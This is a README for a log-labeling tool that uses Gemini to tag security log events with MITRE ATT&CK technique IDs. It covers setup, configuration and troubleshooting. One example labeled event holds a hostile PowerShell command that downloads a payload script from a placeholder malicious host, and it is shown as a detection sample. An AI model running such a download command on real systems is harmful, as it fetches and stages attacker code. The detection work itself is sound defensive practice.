# Log Labeler - AI-Powered MITRE ATT&CK Detection

This tool downloads cleaned text logs from Google Drive, labels them with MITRE ATT&CK technique IDs using **Gemini AI**, and uploads the labeled logs back to Google Drive.

## Features

- **🤖 AI-Powered Detection**: Uses Google's Gemini AI to intelligently identify MITRE ATT&CK techniques
- **🏷️ Automatic Labeling**: Labels each log event as "normal" or "suspicious"
- **🎯 MITRE ATT&CK Mapping**: Identifies applicable technique IDs (e.g., T1059.001 for PowerShell)
- **💡 Reasoning**: Provides explanation for each detection
- **🔄 Fallback Detection**: Uses pattern-based detection if Gemini API is unavailable
- **📊 Session Tracking**: Avoids reprocessing already labeled logs
- **☁️ Google Drive Integration**: Automatic download and upload

## Setup

### 1. Install Dependencies

```bash
cd "Log Labeler"
pip install -r requirements.txt
```

### 2. Get Gemini API Key (FREE)

1. Go to [Google AI Studio](https://makersuite.google.com/app/apikey)
2. Sign in with your Google account
3. Click "Create API Key"
4. Copy the API key

### 3. Configure Environment Variables

Create a `.env` file (copy from `.env.example`):

```bash
# Google Drive Configuration
GDRIVE_TEXT_LOGS_FOLDER=Text_Logs
GDRIVE_LABELED_LOGS_FOLDER=Labeled_Logs

# Number of sessions to process at once
NUM_SESSIONS_TO_LABEL=2

# Gemini AI API Key for MITRE detection
GEMINI_API_KEY=your_actual_gemini_api_key_here
```

**Important**: Replace `your_actual_gemini_api_key_here` with your actual Gemini API key!

### 4. Set Up Google Drive Authentication

Copy `credentials.json` from the Automated Log folder:

```bash
copy "..\Automated Log\credentials.json" .
```

The first time you run the script, it will open a browser for Google authentication.

## Usage

Run the labeler:

```bash
python main.py
```

The script will:
1. Download cleaned logs from the `Text_Logs` folder
2. Analyze each log event using Gemini AI
3. Add labels and MITRE ATT&CK technique IDs
4. Upload labeled logs to the `Labeled_Logs` folder
5. Clean up temporary files

## How It Works

### Gemini AI Analysis

For each log event, Gemini AI analyzes:
- **Label**: Is the activity "normal" or "suspicious"?
- **MITRE Techniques**: Which ATT&CK technique IDs apply?
- **Reasoning**: Why was this classification made?

Example labeled event:
```json
{
  "timestamp": "2025-01-01T12:34:56",
  "process": "powershell.exe",
  "command": "Invoke-WebRequest -Uri https://malicious.com/payload.ps1",
  "label": "suspicious",
  "mitre_techniques": ["T1059.001", "T1071.001"],
  "reasoning": "PowerShell execution downloading external script from web server"
}
```

### Fallback Detection

If Gemini API is unavailable (no API key, rate limit, error), the system automatically falls back to pattern-based detection with keyword matching.

## Supported MITRE ATT&CK Techniques

The system can detect 20+ techniques including:

**Execution**
- **T1059.001**: PowerShell execution
- **T1059.003**: Windows Command Shell

**Exfiltration**
- **T1041**: Exfiltration Over C2 Channel
- **T1567.002**: Exfiltration to Cloud Storage

**Credential Access**
- **T1555.003**: Credentials from Web Browsers
- **T1003.001**: LSASS Memory dumping

**Defense Evasion**
- **T1070.001**: Clear Windows Event Logs
- **T1562.001**: Disable or Modify Tools

**Impact**
- **T1486**: Ransomware/Data Encryption
- **T1490**: Inhibit System Recovery

And many more...

## Configuration Options

### `.env` File

- `GDRIVE_TEXT_LOGS_FOLDER`: Source folder with cleaned logs (default: Text_Logs)
- `GDRIVE_LABELED_LOGS_FOLDER`: Destination folder for labeled logs (default: Labeled_Logs)
- `NUM_SESSIONS_TO_LABEL`: Number of sessions to process per run (default: 2)
- `GEMINI_API_KEY`: Your Gemini API key from Google AI Studio

## Output Format

Labeled logs maintain the same structure as input logs, with added fields:
- `label`: "normal" or "suspicious"
- `mitre_techniques`: Array of technique IDs (e.g., ["T1059.001"])
- `reasoning`: Explanation of the classification

## Troubleshooting

### "Gemini API error: ..."

- **Check your API key**: Verify it's correctly set in `.env`
- **Check API quota**: Gemini free tier has rate limits
- **System will automatically fall back** to pattern-based detection

### "No sessions to label"

- All sessions in Text_Logs have already been processed
- Run Log Cleaner to create new cleaned logs

### Google Drive authentication issues

- Delete `token.pickle` and re-authenticate
- Ensure `credentials.json` is in the Log Labeler folder

### Import errors

Make sure all dependencies are installed:
```bash
pip install -r requirements.txt
```

## Files

- `main.py`: Main script orchestrating the labeling process
- `mitre_detector.py`: Gemini AI integration and MITRE detection logic
- `credentials.json`: Google Drive API credentials (copy from Automated Log)
- `token.pickle`: Cached authentication token (auto-generated)
- `.env`: Configuration file with API key and settings
- `requirements.txt`: Python dependencies

## API Costs

**Gemini AI** uses the free tier:
- ✅ Free quota: 60 requests per minute
- ✅ No credit card required
- ✅ Perfect for this use case

If you exceed the free tier, the system will automatically fall back to pattern-based detection.

```bash
main.py                                mitre_detector.py
   |                                          |
   |--[1] Download logs from Drive           |
   |                                          |
   |--[2] Call create_story_based_labels()-->|
   |                                          |
   |                              [3] Group by minute
   |                                          |
   |                         [4] For each minute:
   |                               - Summarize events
   |                               - Call Gemini AI
   |                               - Get label + MITRE
   |                                          |
   |<--[5] Return story objects---------------|
   |                                          |
   |--[6] Save locally + Upload to Drive     |
   |                                          |
   |--[7] Cleanup temp files                 |
```
